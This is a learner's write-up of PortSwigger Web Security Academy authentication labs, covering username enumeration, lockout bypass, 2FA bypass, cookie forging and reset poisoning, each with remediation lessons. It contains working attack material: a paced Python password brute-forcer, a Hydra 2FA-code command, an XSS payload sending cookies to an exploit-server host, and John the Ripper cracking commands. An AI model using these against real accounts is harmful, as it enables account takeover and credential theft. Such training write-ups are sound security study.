---
layout: default
title: "PortSwigger — Authentication"
permalink: /write-ups/portswigger/authentication/
---

# PortSwigger — Authentication

## Overview

This page documents my notes and write-ups from the **Authentication** module of PortSwigger Web Security Academy labs across the module's three sections: password-based authentication, multi-factor authentication, and other authentication mechanisms.

Authentication vulnerabilities occur when an application fails to correctly verify a user's identity at some stage of the login lifecycle — not just at the login form itself, but across every mechanism that touches credentials, session persistence, or account recovery: username enumeration, brute-force protection, two-factor verification, "stay logged in" cookies, password reset, and password change.

A recurring theme across this module was that authentication logic is only as strong as its **weakest connected endpoint**, and that "looks the same" is not the same as "is the same". Several labs turned on a single byte, a timing difference, or a header the client was never supposed to control.

One lab in this module (2FA bypass using a brute-force attack) was significant enough that I built a dedicated, reusable Python tool for it. That project has its own repository and README, linked below.

The Expert-level lab in this module's password-based section (Broken brute-force protection, multiple credentials per request) is intentionally left for a later pass, once all Apprentice/Practitioner labs across every module are complete.

---

## Labs Covered and Main Technique

| # | Lab | Main Technique |
| --- | --- | --- |
| 01 | Username enumeration via different responses | Differing error message reveals valid usernames |
| 02 | Username enumeration via subtly different responses | Byte-level diff via Grep - Extract |
| 03 | Username enumeration via response timing | Timing side-channel + spoofed `X-Forwarded-For` |
| 04 | Broken brute-force protection, IP block | Interleaving a valid login to reset the lockout counter |
| 05 | Username enumeration via account lock | Lockout-as-oracle + rate-aware password brute-force |
| 06 | 2FA simple bypass | Skipping the verification step via direct navigation |
| 07 | 2FA broken logic | Cookie-based identity swap + code brute-force |
| 08 | 2FA bypass using a brute-force attack (Expert) | Automated re-authentication cycling in Python |
| 09 | Brute-forcing a stay-logged-in cookie | Forging a cookie via weak, unsalted MD5 |
| 10 | Offline password cracking | Stored XSS to steal a cookie, then offline crack |
| 11 | Password reset broken logic | Client-side identity tampering on reset |
| 12 | Password reset poisoning via middleware | Host header injection via `X-Forwarded-Host` |
| 13 | Password brute-force via password change | Differential response oracle on a weaker endpoint |

---

# Lab 01 — Username enumeration via different responses

## Objective

Enumerate a valid username by exploiting a difference in error message text, then brute-force that user's password.

## Methodology

I submitted an invalid username and password and sent the `POST /login` request to Burp Intruder, marking the `username` parameter as the payload position with a Sniper attack, using the candidate username wordlist. After sorting the results by the `Length` column, one response stood out: it returned `"Incorrect password"` instead of the generic `"Invalid username"` shown by every other candidate — confirming that username as valid. I then repeated the attack with that username fixed and the `password` field as the payload position, and found the single response with a `302` status.

## Finding

The application returned two different generic error messages depending on whether the submitted username existed, even though both were intended to look like a single, uniform "invalid credentials" response.

## Impact

Efficient username enumeration turns a combined username+password brute-force problem (a large cluster bomb) into two much smaller, sequential attacks — first confirm the username, then brute-force only the password for that one account.

## Lesson Learned

Authentication error messages must be identical in wording and length,regardless of whether the submitted username exists.

---

# Lab 02 — Username enumeration via subtly different responses

## Objective

Enumerate a valid username where the differing response is not an obviously different message, but a subtle, single-character discrepancy.

## Methodology

Same initial setup as the previous lab (Sniper attack on the `username` field), but this time the error messages were textually identical at a glance: `"Invalid username or password."` for every candidate. I used Burp Intruder's **Grep - Extract** feature to pull the exact error message text into its own column for every response, then compared them directly instead of relying on visual inspection or response length. One response differed by a single character, a trailing space instead of a period, revealing the valid username. Password brute-forcing then proceeded identically to the previous lab.

## Finding

The application's two error messages were near-identical but not byte-for-byte identical — a leftover formatting inconsistency (a typo) was enough to distinguish "user doesn't exist" from "user exists, wrong password."

## Impact

Demonstrates that "the messages look the same" is not sufficient as a defense. Even a one-character difference is a reliable, automatable oracle once you extract and diff responses programmatically instead of eyeballing them.

## Lesson Learned

Don't rely on manual/visual review to confirm that two responses are indistinguishable, generate both server-side from the exact same code path and message template, and verify byte-for-byte equality as part of testing.

---

# Lab 03 — Username enumeration via response timing

## Objective

Enumerate a valid username via a timing side-channel, while also bypassing the application's IP-based brute-force protection.

## Methodology

Early testing showed my IP got blocked after a handful of invalid login attempts. I found the application trusted the `X-Forwarded-For` header to determine the client's IP, allowing me to spoof a new "IP" on every request and sidestep the block entirely. Continuing to test, I noticed something more subtle: for an **invalid** username, the response time was consistently fast and uniform — but for my **own, valid** username, response time increased proportionally to the length of the password I submitted, suggesting a non-constant-time password comparison happening only once the username itself had been confirmed valid.

I set up a Pitchfork attack with two synchronized payload sets: position 1 was the `X-Forwarded-For` header, iterating through numbers 1–100 (a fresh spoofed IP per request, avoiding the block), position 2 was the candidate username list. I fixed the password field to a long, fixed string (~100 characters) to amplify the timing signal. After enabling the `Response received` / `Response completed` columns, one username consistently produced a longer response time than all the others. I repeated the same Pitchfork structure, spoofed IP in position 1, this time the password wordlist in position 2, username fixed, and found the `302` response.

## Finding

Two separate flaws combined here: an IP-based rate limit that trusted a client-controllable header, and a password-comparison routine whose execution time leaked information correlated with username validity (and, implicitly, how much of the submitted input matched).

## Impact

The timing side-channel alone would have been hard to exploit at scale under normal rate limiting, but because the rate limit itself was trivially bypassable via a spoofed header, the two flaws together enabled unrestricted, fully automated username and password enumeration.

## Lesson Learned

Any comparison involving a secret (passwords, tokens, hashes) must run in constant time regardless of input, to avoid leaking information through response timing. Separately, rate limiting must be keyed on a value the client cannot control, the actual connection-level IP, never a raw client-suppliable header like `X-Forwarded-For`, unless it's been validated as coming from a trusted, correctly configured proxy.

---

# Lab 04 — Broken brute-force protection, IP block

## Objective

Bypass an account-lockout brute-force protection that resets after any successful login from the same source, by interleaving guesses against the target account with periodic logins to a known-valid account.

## Methodology

I confirmed empirically that after a fixed number of wrong password attempts against `carlos`, the account is locked, but a single successful login (with my own valid credentials, `wiener:peter`) immediately reset the counter, regardless of which account that successful login belonged to. I built two synchronized wordlists with a small Python script: a username list repeating the pattern `[carlos, carlos, carlos, wiener]` and a matching password list repeating `[candidate1, candidate2, candidate3, peter]`, so that every 4th pair of values was a guaranteed-valid login. I loaded these into Burp Intruder using the **Pitchfork** attack type (which advances both payload lists in lockstep, rather than testing every combination), so each request paired the correct username/password combination from the same line of each list. I set a Grep - Match rule on a string that only appears on Carlos's authenticated account page to flag the successful request automatically.

## Finding

The brute-force lockout counter was reset by any successful authentication from the same client, not specifically by a successful login to the account being attacked, meaning an attacker who owns one legitimate account can indefinitely reset the protection while continuing to attack a completely different one.

## Impact

Complete bypass of an otherwise functioning lockout mechanism, using only one pair of valid credentials, without needing to control the target's IP or wait out any cooldown.

## Lesson Learned

A brute-force counter should only be reset by a successful authentication to the specific account it is protecting, never by any unrelated successful login from the same source.

---

# Lab 05 — Username enumeration via account lock

## Objective

Enumerate a valid username by exploiting the fact that account lockout can only happen to accounts that exist, then brute-force that account's password around an active rate limit.

## Methodology

I confirmed that submitting wrong credentials for a nonexistent username always returned a response of constant length and text, no matter how many times it was repeated, an account that doesn't exist can never be locked. I used Burp Intruder's **Cluster Bomb** attack type with two payload positions: the username candidate list in Position 1 (the "outer" loop, held stable across a full pass of Position 2), and a list of impossible passwords in Position 2, configured to repeat enough times to guarantee a lockout for any username that was actually valid. Sorting the results by the `Length` column, one username stood out with a distinctly different response, confirming it as valid (`adm`) and revealing it had been locked out.

With the username identified, I had to brute-force its password around an active lockout: 3 wrong attempts triggered a ~62 second block. I wrote a small Python script that iterated through the candidate password list, paused for the cooldown period every 3 attempts, and checked each response for a marker present only on a successful login. My first version relied on `response.status_code == 302`, which never appeared, `requests` follows redirects automatically by default, so the status seen was actually that of the final, already-redirected page. After correcting the check to look for `"Log out"` (present only on the authenticated account page), a clean re-run reproduced the real "Success!" output and confirmed the correct password.

## Key Command

```python
import requests
import time

username = "adm"
url = "https://LAB-ID.web-security-academy.net/login"
attempt = 1

with open("wlpass") as file:
    i = 0
    for passwd in file:
        password = passwd.strip()
        if i == 3:
            print("Pausing 62 seconds...")
            time.sleep(62)
            i = 0
        print("[Attempt {}]Testing: u={} | p={}".format(attempt, username, password))
        response = requests.post(url, data={"username": username, "password": password}, timeout=15)
        if "Log out" in response.text:
            print("Success! Credentials: username={}&password={}".format(username, password))
            break
        if response.status_code == 200 and "You have made too" not in response.text:
            print("Login attempt failed! Trying next parameter...")
            i = i + 1
            attempt = attempt + 1
        if "You have made too" in response.text:
            print("[Attempt {}] Blocked.".format(attempt))
            break
```

## Finding

Two separate weaknesses were chained here: the lockout mechanism doubles as a username-existence oracle, since only real accounts can be locked, and the password-level lockout could be fully worked around simply by pacing requests to respect its cooldown window instead of needing to bypass it outright.

## Impact

Full account takeover through a combination of a username-enumeration side channel and patient, rate-aware password brute-forcing, demonstrating that even a functioning lockout doesn't stop an attacker willing to wait for it.

## Lesson Learned

A lockout mechanism should not behave differently based on whether the targeted account exists, an invalid username should be indistinguishable from a valid, not-yet-locked one. A lockout that only delays (rather than escalates or permanently blocks after repeated offenses) still grants an attacker unlimited attempts over time.

---

# Lab 06 — 2FA simple bypass

## Objective

Bypass two-factor authentication entirely, without ever supplying a verification code, by exploiting the application's failure to enforce that the 2FA step was actually completed.

## Methodology

I logged in to my own account and completed the real 2FA flow (retrieving the code from the lab's email client), then made a note of the exact URL of the authenticated account page (`/my-account`). I logged out, then logged back in using the victim's known credentials (`carlos:montoya`). When asked for Carlos's 2FA verification code, which I had no way to obtain, I simply edited the browser's address bar and navigated directly to `/my-account` instead of submitting any code. The page loaded normally, fully authenticated as Carlos.

## Finding

The 2FA code prompt was enforced only as a **client-side navigation step** (a page the user is shown after password login), the server never verified, when `/my-account` was requested, whether the current session had actually completed the second authentication factor.

## Impact

Complete 2FA bypass using only the victim's username and password, with zero need to intercept, guess, or brute-force any verification code, the second factor provided no real security at all.

## Lesson Learned

Every protected resource must independently verify, server-side, that the entire authentication chain, including any second factor, was actually completed for the current session. A "next step" screen in a login flow is UI, not access control, the two must never be conflated.

---

# Lab 07 — 2FA broken logic

## Objective

Bypass two-factor authentication by exploiting a logic flaw that lets an attacker brute-force another user's verification code without ever knowing it.

## Methodology

I logged in normally with my own valid credentials and reached the 2FA verification screen. Inspecting the request in Burp, I noticed a `verify` cookie whose value was simply the username being verified, with no cryptographic binding to my authenticated session.

I changed `verify=wiener` to `verify=carlos` and resent the same request. The application accepted it, meaning it was now checking a 4-digit code against Carlos's account instead of my own, while I remained authenticated as myself.

Since manually brute-forcing 10,000 codes through Burp Community's throttled Intruder would have been too slow, I automated the attack with Hydra, using its `http-post-form` module with a custom `H=` header carrying the forged cookie, and the `G` flag to skip Hydra's default pre-request (which would otherwise have silently regenerated Carlos's code before every attempt).

## Key Command

```bash
hydra -l "carlos" -P codes.txt LAB-ID.web-security-academy.net \
  https-post-form "/login2:mfa-code=^PASS^:G:H=Cookie\: verify=carlos:F=Incorrect security code" \
  -t 50
```
## Finding

The application identified which account's 2FA code was being verified using a client-controllable cookie, and did not apply any rate limiting to verification attempts made against an account other than the one currently logged in.

## Impact

Full account takeover for any known username, without ever knowing that user's password, by simply swapping a single cookie value and brute-forcing the remaining 4-digit code space.

## Lesson Learned

Two-factor verification must be bound entirely server-side to the authenticated session that completed the first authentication step. Any client-suppliable value used to identify "who is being verified" defeats the purpose of the second factor.

---

# Lab 08 — 2FA bypass using a brute-force attack (Expert)

## Objective

Bypass a 2FA implementation that limits verification attempts per login session, by exploiting the absence of any limit on how many times a user can re-authenticate.

## Methodology

I mapped the full authentication flow in detail: `POST /login` → follow redirect to `/login2`, extracting a fresh CSRF token → up to 2 code attempts → on lockout, the response embeds a fresh login form (and CSRF token) rather than fully logging out → repeat. The account-level lockout applied only within a single 2FA challenge, never across re-authentications.

Before automating anything, I modeled the attack probabilistically: with a fixed 2-in-10,000 success chance per login cycle, the number of cycles until success follows a geometric distribution, with an expected value around 5,000 cycles. This confirmed the attack was computationally feasible before committing time to building it.

I then wrote a Python tool (`requests.Session()` for cookie/CSRF persistence, `re` for token extraction, sequential code testing with wraparound, structured logging to file and console, and differentiated error handling separating transient network failures from fatal, unexpected application behavior) to run the full cycle unattended. A real run against the live lab succeeded in 531 cycles (~41 minutes), faster than the statistical expectation.

## Repository

[2fa-bruteforce-bypass-python](https://github.com/pedro18102601/2fa-bruteforce-bypass-python)

## Finding

The brute-force lockout was scoped only to the number of attempts within a single login session, not to the account as a whole, so an attacker with valid credentials of their own could re-authenticate indefinitely, each time receiving a fresh, independent 2FA challenge.

## Impact

Full 2FA bypass despite an apparently correct-looking 2-attempt limit, demonstrating that a protection which looks sound in isolation can be trivially defeated once the broader lifecycle around it is considered.

## Lesson Learned

Brute-force protections must persist across re-authentication, not reset with every new login. Probabilistic modeling is a valuable step before automating a long-running attack, it turns "is this feasible?" into a concrete, testable estimate instead of a guess.

---

# Lab 09 — Brute-forcing a stay-logged-in cookie

## Objective

Forge a valid persistent-login cookie for another user by exploiting a weak, predictable hashing scheme.

## Methodology

After logging in with "stay logged in" enabled, I decoded my own `stay-logged-in` cookie from Base64 and found a `username:hash` structure. I confirmed the encoding was Base64 by its restricted character set and padding, then reproduced my own hash locally (`echo -n "mypassword" | md5sum`) to confirm the algorithm was unsalted MD5.

With the algorithm confirmed, I used Burp Intruder's payload processing feature to automate forging candidate cookies for `carlos`: a chain of three rules: Hash (MD5), Add Prefix (`carlos:`), Base64-encode - applied to each entry of a common-password wordlist before it was sent as the cookie value.

## Key Configuration

Payload processing:

1. Hash: MD5
2. Add Prefix: carlos:
3. Base64-encode

## Finding

The persistence cookie was an unsalted MD5 hash of the password, concatenated with the username and Base64-encoded, with no server-side binding to an actual session record.

## Impact

Any account using a common password could be fully impersonated by forging its cookie offline-style, without ever submitting a real login request or knowing the password in advance.

## Lesson Learned

Persistent authentication tokens must never be derived deterministically from predictable inputs. They should be random, unguessable, and issued and validated entirely server-side.

---

# Lab 10 — Offline password cracking

## Objective

Use a stored XSS vulnerability to steal a victim's real authentication cookie, crack the underlying password hash offline, and use the recovered credentials to delete the victim's account.

## Methodology

I confirmed a stored XSS vulnerability in the blog's comment field with a simple `<script>alert(1)</script>` test. Since the `stay-logged-in` cookie lacked the `HttpOnly` flag, it was readable via JavaScript, so I crafted a payload that redirected any visitor's browser to my Exploit Server with their cookie attached as a query parameter.

After the simulated victim viewed the comment, I retrieved Carlos's real cookie from the Exploit Server's access log, decoded it, and (this time possessing a genuine target hash) cracked it offline with John the Ripper against the `rockyou.txt` wordlist. I then logged in as Carlos with the recovered plaintext password and deleted the account to solve the lab.

## Key Payload

```html
<script>document.location='https://EXPLOIT-ID.exploit-server.net/log?c='+document.cookie</script>
```

## Key Command

```bash
john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --show hash.txt
```

## Finding

The application was vulnerable to stored XSS, exposed a sensitive cookie without `HttpOnly` protection, and used the same weak, unsalted MD5 hashing scheme identified in the previous lab, this time exploitable as a genuine offline crack, since a real target hash had been obtained.

## Impact

Chaining a client-side vulnerability (XSS) with a weak server-side design decision (unsalted hashing) escalated a comment field into full account takeover and a destructive action.

## Lesson Learned

Sensitive cookies should always carry the `HttpOnly` flag to prevent script-based theft. User-supplied input must be properly encoded before being rendered back to other users, and even when a cookie is stolen, weak hashing turns a minor leak into a full credential compromise.

---

# Lab 11 — Password reset broken logic

## Objective

Reset another user's password by tampering with a client-controlled identity field in the password reset request.

## Methodology

I triggered the "forgot password" flow with my own account and intercepted the final request that submits the new password. The request body contained the reset `token`, a `username` field, and the two new-password fields, all editable client-side, in the same request.

I simply changed `username=wiener` to `username=carlos`, keeping the token that had been issued for my own reset, and forwarded the request. The application accepted it and reset Carlos's password.

## Key Request

```
POST /forgot-password HTTP/2
Host: LAB-ID.web-security-academy.net

temp-forgot-password-token=TOKEN&username=carlos&new-password-1=newpass&new-password-2=newpass
```

## Finding

The reset token was not bound server-side to the account it had been generated for. The application trusted a separate, client-suppliable `username` parameter to decide whose password was actually being changed.

## Impact

Complete password reset bypass for any known username, using nothing more than a token that had legitimately been issued to the attacker's own account.

## Lesson Learned

A password reset token should, by itself, be sufficient proof of identity, it must be tied server-side to a single account. Any additional client-supplied identity parameter in the same request is a redundant trust boundary that can be abused.

---

# Lab 12 — Password reset poisoning via middleware

## Objective

Poison a dynamically generated password reset link so that a victim's reset token is sent to an attacker-controlled domain.

## Methodology

I sent the `POST /forgot-password` request to Burp Repeater and added an `X-Forwarded-Host` header pointing to my Exploit Server. This header exists to let a trusted reverse proxy forward the original client-facing host to a backend application, but the backend here trusted it unconditionally when building the absolute reset link, without verifying it came from a legitimate proxy.

The reset email generated for `carlos` now contained a link pointing to my Exploit Server. After the simulated victim clicked it, I retrieved his token from the Exploit Server's access log and used it in a normal password-reset request to take over his account.

## Key Header

```
X-Forwarded-Host: EXPLOIT-ID.exploit-server.net
```

## Finding

The application built absolute, security-sensitive URLs (password reset links) using a client-controllable header, without validating that it had actually been set by a trusted upstream proxy.

## Impact

Full account takeover via token theft, requiring no interaction from the attacker beyond a header addition and waiting for the victim to click a link that looked entirely legitimate.

## Lesson Learned

Headers such as `X-Forwarded-Host` should never be trusted blindly for security-sensitive logic. Base URLs used in emails or redirects should come from a hardcoded, trusted configuration value, not be reconstructed from client-supplied request data.

---

# Lab 13 — Password brute-force via password change

## Objective

Brute-force an account's password through the password-change functionality, bypassing the rate limiting applied to the main login page.

## Methodology

After logging in, I inspected the password-change request and found that the username was submitted as an editable, hidden form field, not tied to the authenticated session. I then tested the endpoint's behavior systematically: wrong current password with matching new passwords triggered a full logout and a temporary lockout, wrong current password with **mismatched** new passwords did not.

Crucially, the error message differed depending on whether the current password was correct, even when the two new-password fields were deliberately set to different, throwaway values. This created an oracle: I could test password candidates without ever completing a real change or triggering the lockout. I automated this in Burp Intruder, fixing `username=carlos` and two mismatched new-password values, iterating `current-password` over a wordlist, and using Grep - Match on the failure string to flag the one differing response.

## Finding

The endpoint applied no rate limiting tied to the target account, and validated field correctness in an order that leaked whether the current password was right or wrong through the response text, before the request could ever complete or trigger the same lockout used elsewhere.

## Impact

Complete bypass of the login page's brute-force protections by using a secondary, less-guarded endpoint that ultimately validates the same credential.

## Lesson Learned

Rate limiting and lockout protections must be applied consistently to every endpoint that validates a password, not just the primary login form. Error messages must never leak which specific validation step failed.

---

# General Takeaways

## Common Root Causes Across This Module

- Trusting client-controllable values (cookies, headers, hidden fields) to establish identity
- Security controls scoped too narrowly (per-session instead of per-account, per-IP instead of per-target-account, or applied to only one endpoint)
- Non-constant-time comparisons and inconsistent error messages that leak internal state (username validity, password correctness) through content, length, or timing
- Weak, unsalted, predictable hashing for tokens meant to be secret
- Missing `HttpOnly` on sensitive cookies
- Rate limiting and lockout mechanisms with resettable or bypassable conditions

## Testing Methodology

My general workflow for authentication testing is:

1. Map the full authentication lifecycle, not just the login form: username enumeration, brute-force protection, 2FA, "stay logged in", password reset, password change.
2. Identify every value the client controls in each request: cookies, hidden fields, headers.
3. Test what happens when that value is changed to point at another account.
4. Compare application responses closely: length, exact text, status code, and timing for differences that might act as an oracle.
5. Check whether protections applied on one endpoint (rate limiting, lockout) are actually applied everywhere the same credential is validated, and whether they can be reset or bypassed via an unrelated action.
6. Confirm any encoding or hashing scheme by reproducing it with known, self-controlled data before attempting to attack it.
7. Model the feasibility of a brute-force attack mathematically before automating it.
8. Automate with the right tool for the job, online attacks need live requests (Burp Intruder, custom scripts); offline cracking needs a real, already-obtained hash (John the Ripper, hashcat).

## Remediation Notes

To reduce authentication risks, applications should:

- Bind every stage of a multi-step authentication flow strictly to the server-side session, never to a client-suppliable identifier.
- Return identical error messages, in content, length, and response time, regardless of whether a username or password is correct.
- Apply rate limiting and lockout consistently across every endpoint that validates a password or code, not only the login page, and scope counters to the specific account being targeted.
- Never derive persistence tokens from unsalted or predictable hashes.
- Set `HttpOnly` (and `Secure`) on all sensitive cookies.
- Never trust `X-Forwarded-For` / `X-Forwarded-Host` or similar headers for security-sensitive logic without strict validation.
- Keep error messages generic enough that they don't leak which specific validation step failed.
- Scope brute-force protections to the entire authentication lifecycle, not just a single request or session, and ensure they cannot be reset by an unrelated successful action.

---

# Final Reflection

This module made it clear that authentication is a **system**, not a single checkpoint. Every lab here broke not because the main login page was weak, but because some other, connected piece of the authentication lifecycle (an error message, a timing difference, a cookie, a header, a secondary endpoint, a re-authentication loop) wasn't held to the same standard.

The most valuable shift in how I approach this now: whenever I see a control that looks solid (rate limiting, 2FA, a hash, an "identical" error message), my first question is no longer "can I break this directly?" but "what else in this application touches the same identity or credential, and is it protected — and worded, and timed — the same way?" That question is what connected almost every lab in this module.